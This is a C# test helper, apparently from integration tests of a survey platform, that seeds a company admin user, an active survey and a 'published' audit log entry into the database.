    private async Task<(Guid SurveyId, Guid ActorId)> SeedSurveyTrailAsync()
    {
        await using var db = CreateContext();

        var now = DateTimeOffset.UtcNow;
        var actor = new User
        {
            Id = Guid.NewGuid(),
            CompanyId = _companyId,
            Email = $"{Guid.NewGuid():N}@{_companyDomain}",
            Name = "Survey Author",
            Role = Roles.CompanyAdmin,
            IsActive = true,
            CreatedAt = now,
            UpdatedAt = now,
        };
        db.Users.Add(actor);

        var survey = new Survey
        {
            Id = Guid.NewGuid(),
            CompanyId = _companyId,
            CreatedBy = actor.Id,
            TitleEn = "Audited survey",
            Type = "general_climate",
            Language = "en",
            StartDate = now,
            EndDate = now.AddDays(7),
            Status = "active",
            CreatedAt = now,
            UpdatedAt = now,
        };
        db.Surveys.Add(survey);

        db.SurveyAuditLogs.Add(new SurveyAuditLog
        {
            Id = Guid.NewGuid(),
            SurveyId = survey.Id,
            Action = "published",
            EntityType = "survey",
            EntityId = survey.Id.ToString(),
            UserId = actor.Id,
            UserName = actor.Name,
            UserEmail = actor.Email,
            UserRole = actor.Role,
            Timestamp = now,
        });

        await db.SaveChangesAsync();
        return (survey.Id, actor.Id);
    }
}
